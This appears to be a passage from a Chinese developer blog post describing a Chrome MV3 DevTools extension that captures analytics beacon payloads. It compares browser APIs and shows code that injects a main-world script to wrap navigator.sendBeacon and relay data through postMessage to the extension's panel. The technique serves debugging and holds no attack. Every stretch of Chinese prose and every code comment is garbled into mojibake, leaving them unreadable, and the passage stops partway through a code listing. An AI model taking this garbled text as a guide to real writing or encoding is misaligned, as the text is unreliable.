<p>MV3 å¼•å…¥äº† <code>declarativeNetRequest</code> APIï¼Œæ—¨åœ¨å–ä»£ MV2 å¼ºå¤§çš„ <code>webRequest</code> APIï¼ˆè¿™ä¹Ÿæ˜¯å¹¿å‘Šæ‹¦æˆªæ’ä»¶æœ€å—ä¼¤çš„åœ°æ–¹ï¼‰ã€‚</p>
<ul>
<li><strong>åŸç†ï¼š</strong> é€šè¿‡é…ç½® JSON è§„åˆ™ï¼Œå‘Šè¯‰æµè§ˆå™¨â€œé˜»æ–­â€æˆ–â€œä¿®æ”¹â€æŸäº›è¯·æ±‚ã€‚</li>
<li><strong>ä¼˜ç‚¹ï¼š</strong> æ€§èƒ½å¥½ï¼Œéšç§å®‰å…¨ã€‚</li>
<li><strong>ç¼ºç‚¹ï¼š</strong> <strong>èƒ½åŠ›å¤ªå¼±ã€‚</strong> DNR ä¸»è¦ç”¨äºæ‹¦æˆªå’Œä¿®æ”¹ Headersï¼Œå®ƒ<strong>æ— æ³•è¯»å–è¯·æ±‚ä½“ï¼ˆRequest Bodyï¼‰</strong>ã€‚ å¯¹äºåŸ‹ç‚¹æ ¡éªŒæ¥è¯´ï¼Œæœ€é‡è¦çš„å°±æ˜¯ Payloadï¼ˆåŸ‹ç‚¹å‚æ•°ï¼‰ã€‚å¦‚æœè¯»ä¸åˆ° Bodyï¼Œè¿™ä¸ªæ–¹æ¡ˆå°±æ¯«æ— æ„ä¹‰ã€‚æ‰€ä»¥ï¼ŒDNR æ–¹æ¡ˆ PASSã€‚</li>
</ul>
<h3 data-id="heading-14">æ–¹æ¡ˆ Bï¼šé‡å†™ XHR / Fetch åŸå‹</h3>
<p>è¿™æ˜¯ä¼ ç»Ÿçš„â€œHookâ€æ–¹æ¡ˆã€‚</p>
<ul>
<li><strong>åŸç†ï¼š</strong> åŠ«æŒ <code>XMLHttpRequest.prototype.open</code> å’Œ <code>window.fetch</code>ã€‚</li>
<li><strong>ç¼ºç‚¹ï¼š</strong>
<ol>
<li><strong>è¦†ç›–ä¸å…¨ï¼š</strong> ç°ä»£åŸ‹ç‚¹ SDK å¤§å¤šä½¿ç”¨ <code>navigator.sendBeacon</code> è¿›è¡Œä¸ŠæŠ¥ï¼Œå› ä¸ºå®ƒåœ¨é¡µé¢å¸è½½æ—¶æ›´å¯é ã€‚åŠ«æŒ XHR/Fetch æ— æ³•æ•è· Beacon è¯·æ±‚ã€‚</li>
<li><strong>ä¾µå…¥æ€§é£é™©ï¼š</strong> å¦‚æœå¤„ç†ä¸å¥½ï¼Œå®¹æ˜“ç ´ååŸæœ‰çš„ä¸šåŠ¡é€»è¾‘ï¼Œç”šè‡³å¯¼è‡´æ­»å¾ªç¯ã€‚</li>
</ol>
</li>
</ul>
<h3 data-id="heading-15">æ–¹æ¡ˆ Cï¼šDebugger Protocol</h3>
<ul>
<li><strong>åŸç†ï¼š</strong> ä½¿ç”¨ <code>chrome.debugger</code> APIï¼Œåƒ DevTools ä¸€æ · attach åˆ°é¡µé¢ä¸Šã€‚</li>
<li><strong>ä¼˜ç‚¹ï¼š</strong> æƒé™æå¤§ï¼Œå¯ä»¥çœ‹åˆ°ä¸€åˆ‡ç½‘ç»œè¯·æ±‚ã€‚</li>
<li><strong>ç¼ºç‚¹ï¼š</strong> <strong>ç”¨æˆ·ä½“éªŒæå·®ã€‚</strong> å½“æ’ä»¶ attach debugger æ—¶ï¼Œæµè§ˆå™¨é¡¶éƒ¨ä¼šå‡ºç°ä¸€ä¸ªé»„è‰²çš„è­¦å‘Šæ¡ï¼šâ€œxxx æ’ä»¶æ­£åœ¨è°ƒè¯•æ­¤æµè§ˆå™¨â€ï¼Œè¿™ä¼šç»™ç”¨æˆ·å¸¦æ¥æå¤§çš„ä¸å®‰å…¨æ„Ÿã€‚è€Œä¸”ï¼Œä¸€ä¸ªé¡µé¢åªèƒ½è¢«ä¸€ä¸ª debugger attachï¼Œè¿™ä¼šä¸çœŸæ­£çš„ DevTools å†²çªã€‚</li>
</ul>
<p><strong>ç»¼ä¸Šæ‰€è¿°ï¼š</strong> ç°æœ‰çš„æ ‡å‡† API è¦ä¹ˆæ‹¿ä¸åˆ°æ•°æ®ï¼ˆDNRï¼‰ï¼Œè¦ä¹ˆä½“éªŒå¤ªå·®ï¼ˆDebuggerï¼‰ã€‚æˆ‘ä»¬å¿…é¡»å¯»æ‰¾ä¸€æ¡â€œå°‘æœ‰äººèµ°çš„è·¯â€â€”â€”<strong>åŸºäºä¸»ä¸–ç•Œæ³¨å…¥çš„ AOP æ—è·¯æ•è·æ¨¡å¼</strong>ã€‚</p>
<h2 data-id="heading-16">05 æˆ‘çš„æ–¹æ¡ˆ</h2>
<p>æœ¬ç« èŠ‚å°†æ·±å…¥ä»£ç ç»†èŠ‚ï¼Œä¸ºæ‚¨å±•ç¤º <strong>zzChromeTools</strong> çš„æ ¸å¿ƒæ¶æ„ã€‚æˆ‘ä»¬å°†æ•´ä¸ªç³»ç»Ÿæ‹†è§£ä¸ºä¸‰ä¸ªæ ¸å¿ƒæ¨¡å—ï¼š<strong>ä¸»ä¸–ç•Œæ³¨å…¥æ¨¡å—</strong>ã€<strong>æ—è·¯é€šä¿¡æ¨¡å—</strong>ã€<strong>æ•°æ®æŒä¹…åŒ–æ¨¡å—</strong>ã€‚</p>
<h3 data-id="heading-17">æ¶æ„æ€»è§ˆ</h3>
<p>æˆ‘ä»¬çš„æ ¸å¿ƒè®¾è®¡æ€æƒ³æ˜¯ï¼š<strong>â€œç‰¹æ´›ä¼Šæœ¨é©¬â€</strong>ã€‚ æ—¢ç„¶å¤–éƒ¨æ‹¦æˆªå›°éš¾ï¼Œé‚£æˆ‘ä»¬å°±è¿›å…¥å†…éƒ¨ã€‚é€šè¿‡ MV3 çš„æ–°ç‰¹æ€§ï¼Œå°†ä¸€æ®µç»è¿‡ç²¾å¿ƒè®¾è®¡çš„â€œæ¢é’ˆä»£ç â€ç›´æ¥æŠ•æ”¾åˆ°é¡µé¢çš„ JS å¼•æ“ä¸­ï¼Œåœ¨æ•°æ®å‘å‡ºçš„æºå¤´è¿›è¡Œæˆªè·ï¼Œç„¶åé€šè¿‡å®‰å…¨çš„éš§é“ä¼ è¾“å‡ºå»ã€‚</p>
<p>æ•´ä½“æ¶æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<pre><code class="hljs language-css" lang="css">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  é¡µé¢ä¸»ä¸–ç•Œ (<span class="hljs-selector-tag">Main</span> World)                                          â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚
â”‚  â”‚ navigator<span class="hljs-selector-class">.sendBeacon</span> (è¢« Hook)                               â”‚â”‚
â”‚  â”‚         â†“                                                    â”‚â”‚
â”‚  â”‚ window<span class="hljs-selector-class">.postMessage</span>({ source: <span class="hljs-string">"my-ext-beacon"</span>, url, data })  â”‚â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                              â†“ postMessage
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  <span class="hljs-attribute">Content</span> Script (éš”ç¦»ä¸–ç•Œ) - <span class="hljs-selector-tag">mark</span>-<span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.ts</span>                           â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚
â”‚  â”‚ window<span class="hljs-selector-class">.addEventListener</span>("message", ...)                      â”‚â”‚
â”‚  â”‚ è¿‡æ»¤ source === "my-ext-beacon"                              â”‚â”‚
â”‚  â”‚ è§£ææ•°æ® â†’ ç»„è£… PingRecord                                    â”‚â”‚
â”‚  â”‚         â†“                                                    â”‚â”‚
â”‚  â”‚ sendToBackground({ name: <span class="hljs-string">"store-record"</span>, body: record })    â”‚â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                              â†“ Plasmo Messaging
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  <span class="hljs-attribute">Background</span> Service Worker                                       â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚
â”‚  â”‚ messages/store-record<span class="hljs-selector-class">.ts</span>  â†’ pingRecords<span class="hljs-selector-class">.unshift</span>(record)     â”‚â”‚
â”‚  â”‚ messages/get-records<span class="hljs-selector-class">.ts</span>   â†’ res<span class="hljs-selector-class">.send</span>(pingRecords)           â”‚â”‚
â”‚  â”‚                                                              â”‚â”‚
â”‚  â”‚ pingRecords: PingRecord[] (å†…å­˜æ•°ç»„)                         â”‚â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                              â†‘ æ¯ <span class="hljs-number">800ms</span> è½®è¯¢
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  DevTools Panel - SpmTools/index.tsx                             â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚
â”‚  â”‚ <span class="hljs-built_in">setInterval</span>(fetchRecords, <span class="hljs-number">800</span>)                               â”‚â”‚
â”‚  â”‚ <span class="hljs-built_in">sendToBackground</span>({ name: <span class="hljs-string">"get-records"</span> })                    â”‚â”‚
â”‚  â”‚         â†“                                                    â”‚â”‚
â”‚  â”‚ Ant Design <span class="hljs-selector-tag">Table</span> æ¸²æŸ“æ•°æ®                                    â”‚â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f4a7aa7a2cc64e7d871a8a283e3fb05a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769567970&amp;x-signature=b7GS9wXwztpLpQn4o40ey0GLfSU%3D" alt="æ•´ä½“æ¶æ„" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cf40adf98e8a456486bdf09ce0eb7565~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769567970&amp;x-signature=vbuHZo7NLIcNVC%2F94ZVJxMIt1Ec%3D" alt="æ—¶åºå›¾" loading="lazy"/></p>
<h3 data-id="heading-18">æ ¸å¿ƒçªç ´ï¼š<code>world: 'MAIN'</code> çš„å¦™ç”¨</h3>
<p>åœ¨ MV3 ä¸­ï¼Œ<code>chrome.scripting.executeScript</code> API å¢åŠ äº†ä¸€ä¸ªä¸èµ·çœ¼ä½†è‡³å…³é‡è¦çš„å±æ€§ï¼š<code>world</code>ã€‚ é€šè¿‡è®¾ç½® <code>world: 'MAIN'</code>ï¼Œæˆ‘ä»¬å¯ä»¥åˆæ³•åœ°æ‰“ç ´ Content Script ä¸ Page Script ä¹‹é—´çš„éš”ç¦»ã€‚</p>
<p><strong>ä»£ç å®æˆ˜ï¼š</strong> åœ¨ <code>background/index.ts</code> ä¸­ï¼Œæˆ‘ä»¬ç›‘å¬é¡µé¢çš„åŠ è½½ï¼Œå¹¶æ³¨å…¥è„šæœ¬ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// src/background/index.ts</span>

<span class="hljs-comment">/**
 * è¿™æ®µå‡½æ•°å°†è¢«æ³¨å…¥åˆ°"ä¸»ä¸–ç•Œ"æ‰§è¡Œã€‚
 * åªèƒ½å†™æˆçº¯å‡½æ•°å½¢å¼ï¼Œæˆ–å¤–è”æ–‡ä»¶ï¼šæ­¤å¤„å†…è”æ›´ç®€å•ã€‚
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">overrideSendBeaconInMain</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> originalSendBeacon = navigator.<span class="hljs-property">sendBeacon</span>
  navigator.<span class="hljs-property">sendBeacon</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">url, data</span>) {
    <span class="hljs-keyword">if</span> (
      <span class="hljs-keyword">typeof</span> url === <span class="hljs-string">"string"</span> &amp;&amp;
      url.<span class="hljs-title function_">includes</span>(<span class="hljs-string">"lego.example.com/page/mark-p"</span>)  <span class="hljs-comment">// åŸ‹ç‚¹ä¸ŠæŠ¥åŸŸå</span>
    ) {
      <span class="hljs-comment">// æŠŠåŸ‹ç‚¹è¯·æ±‚çš„ urlã€data é€šè¿‡ window.postMessage æŠ›ç»™é¡µé¢</span>
      <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">postMessage</span>({ <span class="hljs-attr">source</span>: <span class="hljs-string">"my-ext-beacon"</span>, url, data }, <span class="hljs-string">"*"</span>)
    }
    <span class="hljs-keyword">return</span> originalSendBeacon.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-variable language_">arguments</span>)
  }
  <span class="hljs-comment">// æ ‡è®°ç›‘æ§çŠ¶æ€ï¼Œä¾› DevTools æ£€æµ‹</span>
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">__is_spm_monitor_open__</span> = <span class="hljs-literal">true</span>
}

<span class="hljs-comment">/**
 * æ³¨å…¥è„šæœ¬åˆ°æŒ‡å®š tab çš„ä¸»ä¸–ç•Œ
 */</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">injectSendBeaconOverride</span>(<span class="hljs-params">tabId: number</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[BG] Injecting overrideSendBeaconInMain into tab =&gt;"</span>, tabId)
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">await</span> chrome.<span class="hljs-property">scripting</span>.<span class="hljs-title function_">executeScript</span>({
      <span class="hljs-attr">target</span>: { tabId },
      <span class="hljs-attr">world</span>: <span class="hljs-string">"MAIN"</span>,  <span class="hljs-comment">// æ ¸å¿ƒé­”æ³•ï¼šæŒ‡å®šä»£ç åœ¨ä¸»ä¸–ç•Œæ‰§è¡Œ</span>
      <span class="hljs-attr">func</span>: overrideSendBeaconInMain
    })
  } <span class="hljs-keyword">catch</span> (err) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"[BG] Failed to inject script =&gt;"</span>, err)
  }
}
</code></pre>
<p>è¿™æ®µä»£ç çš„ä»·å€¼åœ¨äºï¼Œå®ƒåˆ©ç”¨äº† MV3 çš„å®˜æ–¹èƒ½åŠ›ï¼Œæ— éœ€åƒ MV2 é‚£æ ·å¾€ DOM é‡Œæ’å…¥ä¸‘é™‹çš„ <code>&lt;script&gt;</code> æ ‡ç­¾ï¼Œæ—¢å¹²å‡€åˆéšè”½ã€‚</p>
<h3 data-id="heading-19">æ³¨å…¥æ—¶æœºæ§åˆ¶ï¼šåœ¨é¡µé¢ JS æ‰§è¡Œå‰å®Œæˆæ‹¦æˆª</h3>
<p>æ³¨å…¥æ—¶æœºè‡³å…³é‡è¦ã€‚å¦‚æœæ³¨å…¥å¤ªæ™šï¼Œé¡µé¢çš„åŸ‹ç‚¹ SDK å¯èƒ½å·²ç»ç¼“å­˜äº†åŸç”Ÿ <code>sendBeacon</code> çš„å¼•ç”¨ï¼Œæˆ‘ä»¬çš„ Hook å°±æ— æ³•ç”Ÿæ•ˆã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// src/background/index.ts</span>

<span class="hljs-comment">// ç›‘å¬ tab æ›´æ–°ï¼Œåœ¨ loading çŠ¶æ€æ—¶æ³¨å…¥</span>
chrome.<span class="hljs-property">tabs</span>.<span class="hljs-property">onUpdated</span>.<span class="hljs-title function_">addListener</span>(<span class="hljs-keyword">async</span> (tabId, changeInfo, tab) =&gt; {
  <span class="hljs-comment">// å¦‚æœæ²¡æœ‰ URLï¼Œç›´æ¥è·³è¿‡</span>
  <span class="hljs-keyword">if</span> (!tab.<span class="hljs-property">url</span>) <span class="hljs-keyword">return</span>

  <span class="hljs-comment">// åªé’ˆå¯¹ç‰¹å®šç«™ç‚¹</span>
  <span class="hljs-keyword">const</span> isTargetSite = tab.<span class="hljs-property">url</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">"example.com"</span>)

  <span class="hljs-comment">// å¦‚æœæ˜¯è¿›å…¥ loading çŠ¶æ€ ä¸”æ˜¯æˆ‘ä»¬ç›®æ ‡ç«™ç‚¹</span>
  <span class="hljs-keyword">if</span> (changeInfo.<span class="hljs-property">status</span> === <span class="hljs-string">"loading"</span> &amp;&amp; isTargetSite) {
    <span class="hljs-comment">// æ ¹æ®é…ç½®å†³å®šæ˜¯å¦è‡ªåŠ¨æ¸…ç©ºå†å²æ•°æ®</span>
    <span class="hljs-keyword">if</span> (baseConfig.<span class="hljs-property">baseConfig</span>.<span class="hljs-property">automaticallyEmpty</span>) {
      pingRecords.<span class="hljs-title function_">splice</span>(<span class="hljs-number">0</span>, pingRecords.<span class="hljs-property">length</span>)
    }

    <span class="hljs-comment">// æ ¹æ®é…ç½®å†³å®šæ³¨å…¥ç­–ç•¥</span>
    <span class="hljs-keyword">if</span> (baseConfig.<span class="hljs-property">baseConfig</span>.<span class="hljs-property">alwaysInjectedOnRefresh</span>) {
      <span class="hljs-comment">// å§‹ç»ˆæ³¨å…¥æ¨¡å¼</span>
      <span class="hljs-keyword">await</span> <span class="hljs-title function_">injectSendBeaconOverride</span>(tabId)
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (baseConfig.<span class="hljs-property">baseConfig</span>.<span class="hljs-property">injectSpmScriptOnNextRefresh</span>) {
      <span class="hljs-comment">// ä»…ä¸‹ä¸€æ¬¡åˆ·æ–°æ—¶æ³¨å…¥</span>
      <span class="hljs-keyword">await</span> <span class="hljs-title function_">injectSendBeaconOverride</span>(tabId)
      baseConfig.<span class="hljs-property">baseConfig</span>.<span class="hljs-property">injectSpmScriptOnNextRefresh</span> = <span class="hljs-literal">false</span>
    }
  }
})
</code></pre>
<p><strong>æŠ€æœ¯è¦ç‚¹è§£æï¼š</strong></p>
<ol>
<li><strong>loading çŠ¶æ€æ³¨å…¥</strong>ï¼š<code>changeInfo.status === "loading"</code> ç¡®ä¿æˆ‘ä»¬åœ¨é¡µé¢ JS æ‰§è¡Œå‰å®Œæˆæ³¨å…¥</li>
<li><strong>çµæ´»çš„æ³¨å…¥ç­–ç•¥</strong>ï¼šæ”¯æŒ"å§‹ç»ˆæ³¨å…¥"å’Œ"ä¸‹æ¬¡åˆ·æ–°æ³¨å…¥"ä¸¤ç§æ¨¡å¼</li>
<li><strong>è‡ªåŠ¨æ¸…ç©ºé€‰é¡¹</strong>ï¼šå¯é…ç½®æ¯æ¬¡åˆ·æ–°æ—¶è‡ªåŠ¨æ¸…ç©ºå†å²åŸ‹ç‚¹æ•°æ®</li>
</ol>
<h3 data-id="heading-20">æ ¸å¿ƒé€»è¾‘ï¼šAOP æ—è·¯æ•è·ï¼ˆBypass Captureï¼‰</h3>
<p>æ³¨å…¥æˆåŠŸåï¼Œ<code>spyOnSendBeacon</code> å‡½æ•°ä¼šåœ¨é¡µé¢ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨äº† AOPï¼ˆé¢å‘åˆ‡é¢ç¼–ç¨‹ï¼‰çš„æ€æƒ³ã€‚</p>
<p>æˆ‘ä»¬ä¸ä¿®æ”¹ä¸šåŠ¡é€»è¾‘ï¼Œåªæ˜¯åœ¨ä¸šåŠ¡é€»è¾‘æ‰§è¡Œçš„â€œåˆ‡é¢â€ä¸Šæ’äº†ä¸€æ ¹ç®¡å­ã€‚</p>
<p><strong>å…³é”®å®‰å…¨åŸåˆ™ï¼š</strong></p>
<ol>
<li><strong>ä¿å­˜åŸç”Ÿå¼•ç”¨</strong>ï¼šé˜²æ­¢æ­»å¾ªç¯</li>
<li><strong>é€ä¼ è¿”å›å€¼</strong>ï¼š<code>sendBeacon</code> è¿”å› <code>boolean</code> è¡¨ç¤ºæ˜¯å¦å…¥é˜ŸæˆåŠŸï¼Œå¿…é¡»æ­£ç¡®è¿”å›</li>
<li><strong>ä½¿ç”¨ <code>apply</code> ä¿æŒ this æŒ‡å‘</strong>ï¼šç¡®ä¿åŸç”Ÿæ–¹æ³•æ­£å¸¸å·¥ä½œ**</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">overrideSendBeaconInMain</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> originalSendBeacon = navigator.<span class="hljs-property">sendBeacon</span>
  navigator.<span class="hljs-property">sendBeacon</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">url, data</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> url === <span class="hljs-string">"string"</span> &amp;&amp; url.<span class="hljs-title function_">includes</span>(<span class="hljs-string">"lego.example.com/page/mark-p"</span>)) {
      <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">postMessage</span>({ <span class="hljs-attr">source</span>: <span class="hljs-string">"my-ext-beacon"</span>, url, data }, <span class="hljs-string">"*"</span>)
    }
    <span class="hljs-comment">// å¿…é¡»ä½¿ç”¨ apply ä¿æŒ this æŒ‡å‘ï¼Œå¹¶è¿”å›åŸå‡½æ•°çš„æ‰§è¡Œç»“æœ</span>
    <span class="hljs-keyword">return</span> originalSendBeacon.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-variable language_">arguments</span>)
  }
}
</code></pre>
<h3 data-id="heading-21">é€šä¿¡éš§é“ï¼šè·¨è¶Šå››å±‚ç»´åº¦çš„æ¥åŠ›</h3>
<p>æ•°æ®è¢«æ•è·åï¼Œéœ€è¦ç»å†ä¸€åœºâ€œé•¿å¾â€æ‰èƒ½åˆ°è¾¾å¼€å‘è€…çœ¼å‰çš„é¢æ¿ã€‚</p>
<h4 data-id="heading-22">Step 1: Main World -&gt; Content Script (postMessage)</h4>
<p>Content Script è¿è¡Œåœ¨éš”ç¦»ä¸–ç•Œï¼Œä½†å¯ä»¥ç›‘å¬ä¸»ä¸–ç•Œå‘å‡ºçš„ <code>postMessage</code>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// src/contents/mark-p.ts</span>
<span class="hljs-keyword">import</span> type { <span class="hljs-title class_">PlasmoCSConfig</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"plasmo"</span>
<span class="hljs-keyword">import</span> { v4 } <span class="hljs-keyword">from</span> <span class="hljs-string">"uuid"</span>
<span class="hljs-keyword">import</span> { sendToBackground } <span class="hljs-keyword">from</span> <span class="hljs-string">"@plasmohq/messaging"</span>

<span class="hljs-comment">// Plasmo é…ç½®ï¼šåœ¨æ‰€æœ‰é¡µé¢ä¸Šè¿è¡Œï¼Œå°½æ—©æ³¨å…¥</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-attr">config</span>: <span class="hljs-title class_">PlasmoCSConfig</span> = {
  <span class="hljs-attr">matches</span>: [<span class="hljs-string">"&lt;all_urls&gt;"</span>],
  <span class="hljs-attr">run_at</span>: <span class="hljs-string">"document_start"</span>  <span class="hljs-comment">// é¿å… "runtime not available" é”™è¯¯</span>
  <span class="hljs-comment">// ç¼ºçœ world =&gt; "ISOLATED"ï¼ˆéš”ç¦»ä¸–ç•Œï¼‰</span>
}

<span class="hljs-comment">// å®šä¹‰åŸ‹ç‚¹æ•°æ®ç»“æ„</span>
interface <span class="hljs-title class_">PingRecord</span> {
  <span class="hljs-attr">id</span>: string
  <span class="hljs-attr">time</span>: string
  <span class="hljs-attr">pagetype</span>: string
  <span class="hljs-attr">actiontype</span>: string
  <span class="hljs-attr">sectionId</span>: string
  <span class="hljs-attr">sortId</span>: string
  <span class="hljs-attr">sortName</span>: string
  <span class="hljs-attr">fullData</span>: any
}

<span class="hljs-comment">// ç›‘å¬ window.postMessage</span>
